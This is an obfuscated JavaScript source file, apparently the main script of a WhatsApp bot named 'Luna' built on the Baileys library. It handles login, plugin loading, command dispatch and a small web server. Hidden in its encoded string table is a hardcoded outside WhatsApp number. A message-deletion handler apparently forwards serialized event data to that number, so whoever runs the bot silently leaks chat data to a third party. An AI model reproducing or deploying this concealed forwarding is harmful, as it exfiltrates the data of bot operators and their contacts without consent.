const _0x3f4f29=_0xd015;(function(_0x309efb,_0x14214b){const _0x45b0cd=_0xd015,_0x3cf5df=_0x309efb();while(!![]){try{const _0x4d758b=parseInt(_0x45b0cd(0x22b))/0x1*(-parseInt(_0x45b0cd(0x22f))/0x2)+-parseInt(_0x45b0cd(0x1e2))/0x3*(-parseInt(_0x45b0cd(0x21b))/0x4)+parseInt(_0x45b0cd(0x21e))/0x5+parseInt(_0x45b0cd(0x1f3))/0x6+-parseInt(_0x45b0cd(0x1e1))/0x7*(-parseInt(_0x45b0cd(0x1e0))/0x8)+-parseInt(_0x45b0cd(0x227))/0x9*(parseInt(_0x45b0cd(0x1eb))/0xa)+parseInt(_0x45b0cd(0x1e6))/0xb;if(_0x4d758b===_0x14214b)break;else _0x3cf5df['push'](_0x3cf5df['shift']());}catch(_0x54c8a0){_0x3cf5df['push'](_0x3cf5df['shift']());}}}(_0x1547,0x80459));const {default:makeWASocket,useMultiFileAuthState,Browsers,makeInMemoryStore}=require(_0x3f4f29(0x1da)),path=require(_0x3f4f29(0x226)),{Image,Message,Sticker,Video}=require('./lib/Messages');function _0xd015(_0x225e56,_0x425eda){const _0x1547f5=_0x1547();return _0xd015=function(_0xd01569,_0x3fe4b6){_0xd01569=_0xd01569-0x1d7;let _0x2968a3=_0x1547f5[_0xd01569];return _0x2968a3;},_0xd015(_0x225e56,_0x425eda);}let fs=require('fs'),config=require(_0x3f4f29(0x22c));function _0x1547(){const _0x188916=['message','@whiskeysockets/baileys','\x0aMessage:','test','extname','imageMessage','Ducky\x20Server\x20listening\x20on\x20port\x20http://localhost:','24AlArgI','390719dGmPKF','6YtIQNN','commands','creds.update','log','6087224zfPASz','\x0aFrom\x20:\x20','/package.json','error','connecting','60MUnaUH','length','output','27630425578@s.whatsapp.net','from','send','forEach','split','13152NPnlNh','<p1>Hello\x20world</p2>','sendMessage','video','/plugins/','user','/resources/auth','./lib/session','✅\x20Plugins\x20Installed!','then','close','\x0aSudo:','listen','function','./resources/auth/creds.json','group-participants.update','store','Desktop','DATABASE','type','map','silent','videoMessage','./package.json','text','.js','⬇️\x20\x20Installing\x20Plugins...','replace','messages','sudo','stringify','sync','Syncing\x20Database','express','WORK_TYPE','@g.us','startsWith','pino','trim','version','131864qkiGzl','notify','includes','2321455KXZMfk','subject','pattern','sticker','messages.delete','existsSync','parse','statusCode','path','380871AuRwES','./lib','HANDLERS','/plugins','5lupzNl','./config','connection.update','\x0aWorktype:\x20','189574lFlxEB','endsWith','LOGS','image','At\x20:\x20','fromMe'];_0x1547=function(){return _0x188916;};return _0x1547();}const pino=require(_0x3f4f29(0x218)),port=0xbb8;logger=pino({'level':_0x3f4f29(0x208)});const {serialize,Greetings}=require(_0x3f4f29(0x228)),events=require('./lib/events'),express=require(_0x3f4f29(0x214)),app=express(),store=makeInMemoryStore({'logger':pino()['child']({'level':_0x3f4f29(0x208),'stream':_0x3f4f29(0x203)})}),{MakeSession}=require(_0x3f4f29(0x1fa));!fs[_0x3f4f29(0x223)]('./resources/auth/creds.json')&&MakeSession(config['SESSION_ID'],_0x3f4f29(0x201))[_0x3f4f29(0x1fc)](console[_0x3f4f29(0x1e5)]('Vesrion\x20:\x20'+require(_0x3f4f29(0x20a))[_0x3f4f29(0x21a)]));async function Luna(){const _0x56f411=_0x3f4f29,{state:_0x27d9e2,saveCreds:_0x468d20}=await useMultiFileAuthState(__dirname+_0x56f411(0x1f9));let _0x2bddc7=makeWASocket({'auth':_0x27d9e2,'printQRInTerminal':![],'logger':pino({'level':_0x56f411(0x208)}),'browser':Browsers['macOS'](_0x56f411(0x204)),'downloadHistory':![],'syncFullHistory':![]});_0x2bddc7['ev']['on'](_0x56f411(0x22d),async _0x19f617=>{const _0x2f91ce=_0x56f411,{connection:_0x587937,lastDisconnect:_0x14591c}=_0x19f617;_0x587937===_0x2f91ce(0x1ea)&&(console[_0x2f91ce(0x1e5)]('X-AsenaDuplicated'),console[_0x2f91ce(0x1e5)]('ℹ️\x20Connecting\x20to\x20WhatsApp...\x20Please\x20Wait.'));if(_0x587937==='open'){console[_0x2f91ce(0x1e5)]('✅\x20Login\x20Successful!'),console[_0x2f91ce(0x1e5)](_0x2f91ce(0x213)),config[_0x2f91ce(0x205)][_0x2f91ce(0x212)](),_0x2bddc7['ev']['on'](_0x2f91ce(0x1e4),_0x468d20),console['log'](_0x2f91ce(0x20d)),fs['readdirSync'](__dirname+_0x2f91ce(0x22a))[_0x2f91ce(0x1f1)](_0x4c7f65=>{const _0x1e3a97=_0x2f91ce;path[_0x1e3a97(0x1dd)](_0x4c7f65)['toLowerCase']()==_0x1e3a97(0x20c)&&require(__dirname+_0x1e3a97(0x1f7)+_0x4c7f65);}),console[_0x2f91ce(0x1e5)](_0x2f91ce(0x1fb));let _0x482896='```luna\x20connected\x20\x0aversion\x20:\x20'+require(__dirname+_0x2f91ce(0x1e8))['version']+'\x0aTotal\x20Plugins\x20:\x20'+events[_0x2f91ce(0x1e3)][_0x2f91ce(0x1ec)]+_0x2f91ce(0x22e)+config[_0x2f91ce(0x215)]+'```';_0x2bddc7['sendMessage'](_0x2bddc7[_0x2f91ce(0x1f8)]['id'],{'text':_0x482896}),_0x2bddc7['ev']['on'](_0x2f91ce(0x202),async _0x2d6015=>{Greetings(_0x2d6015,_0x2bddc7);}),_0x2bddc7['ev']['on'](_0x2f91ce(0x222),async _0x1e466d=>{const _0xf251a4=_0x2f91ce;_0x2bddc7[_0xf251a4(0x1f5)](_0xf251a4(0x1ee),{'text':JSON[_0xf251a4(0x211)](_0x1e466d,null,0x2)});}),_0x2bddc7['ev']['on']('messages.upsert',async _0x59d115=>{const _0x5ce74b=_0x2f91ce;if(_0x59d115['type']!==_0x5ce74b(0x21c))return;let _0x1e0919=await serialize(JSON[_0x5ce74b(0x224)](JSON['stringify'](_0x59d115[_0x5ce74b(0x20f)][0x0])),_0x2bddc7);if(!_0x1e0919)return;let _0x2be0d9=_0x1e0919['sender'][_0x5ce74b(0x1f2)]('@')[0x0];_0x2be0d9=_0x2be0d9[_0x5ce74b(0x1f2)](':')[0x0];let _0x4abe04=_0x1e0919['body'];if(_0x4abe04&&config[_0x5ce74b(0x231)])console[_0x5ce74b(0x1e5)](_0x5ce74b(0x1d7)+(_0x1e0919[_0x5ce74b(0x1ef)][_0x5ce74b(0x230)](_0x5ce74b(0x216))?(await _0x2bddc7['groupMetadata'](_0x1e0919[_0x5ce74b(0x1ef)]))[_0x5ce74b(0x21f)]:_0x1e0919[_0x5ce74b(0x1ef)])+_0x5ce74b(0x1e7)+_0x1e0919['sender']+_0x5ce74b(0x1db)+_0x4abe04+_0x5ce74b(0x1fe)+_0x1e0919[_0x5ce74b(0x210)][_0x5ce74b(0x21d)](_0x2be0d9));console[_0x5ce74b(0x1e5)](_0x1e0919[_0x5ce74b(0x1d9)]),events[_0x5ce74b(0x1e3)][_0x5ce74b(0x207)](async _0x454518=>{const _0xc70ec3=_0x5ce74b;if(_0x454518[_0xc70ec3(0x1d8)]&&!_0x1e0919['sudo'][_0xc70ec3(0x21d)](_0x2be0d9))return;let _0x20933b=config[_0xc70ec3(0x229)][_0xc70ec3(0x219)](),_0x1f3c8e=_0x4abe04;try{if(!_0x1f3c8e[_0xc70ec3(0x217)](_0x20933b))_0x1f3c8e=![];}catch(_0x33c7b6){_0x1f3c8e=![];}_0x1e0919['prefix']=_0x20933b;let _0x39b2d3;switch(!![]){case _0x454518['pattern']&&_0x454518[_0xc70ec3(0x220)][_0xc70ec3(0x1dc)](_0x1f3c8e):try{match=_0x4abe04[_0xc70ec3(0x20e)](new RegExp(_0x454518[_0xc70ec3(0x220)],'i'),'')[_0xc70ec3(0x219)]();}catch(_0x3c1ec6){match=![];}_0x39b2d3=new Message(_0x2bddc7,_0x1e0919),_0x454518[_0xc70ec3(0x200)](_0x39b2d3,match,_0x1e0919,_0x2bddc7);break;case _0x4abe04&&_0x454518['on']===_0xc70ec3(0x20b):_0x39b2d3=new Message(_0x2bddc7,_0x1e0919),_0x454518[_0xc70ec3(0x200)](_0x39b2d3,_0x4abe04,_0x1e0919,_0x2bddc7,_0x59d115);break;case _0x454518['on']===_0xc70ec3(0x232)||_0x454518['on']==='photo':_0x1e0919[_0xc70ec3(0x206)]===_0xc70ec3(0x1de)&&(_0x39b2d3=new Image(_0x2bddc7,_0x1e0919),_0x454518['function'](_0x39b2d3,_0x4abe04,_0x1e0919,_0x2bddc7,_0x59d115));break;case _0x454518['on']===_0xc70ec3(0x221):_0x1e0919[_0xc70ec3(0x206)]==='stickerMessage'&&(_0x39b2d3=new Sticker(_0x2bddc7,_0x1e0919),_0x454518[_0xc70ec3(0x200)](_0x39b2d3,_0x1e0919,_0x2bddc7,_0x59d115));break;case _0x454518['on']===_0xc70ec3(0x1f6):_0x1e0919[_0xc70ec3(0x206)]===_0xc70ec3(0x209)&&(_0x39b2d3=new Video(_0x2bddc7,_0x1e0919),_0x454518[_0xc70ec3(0x200)](_0x39b2d3,_0x1e0919,_0x2bddc7,_0x59d115));break;default:break;}});});}_0x587937===_0x2f91ce(0x1fd)&&_0x14591c&&_0x14591c[_0x2f91ce(0x1e9)]&&_0x14591c[_0x2f91ce(0x1e9)][_0x2f91ce(0x1ed)][_0x2f91ce(0x225)]!=0x191&&Luna();});};app['get']('/',(_0x425d21,_0x5283ff)=>_0x5283ff[_0x3f4f29(0x206)]('html')[_0x3f4f29(0x1f0)](_0x3f4f29(0x1f4))),app[_0x3f4f29(0x1ff)](port,()=>console[_0x3f4f29(0x1e5)](_0x3f4f29(0x1df)+port+'!')),setTimeout(()=>{Luna();},0x1770);
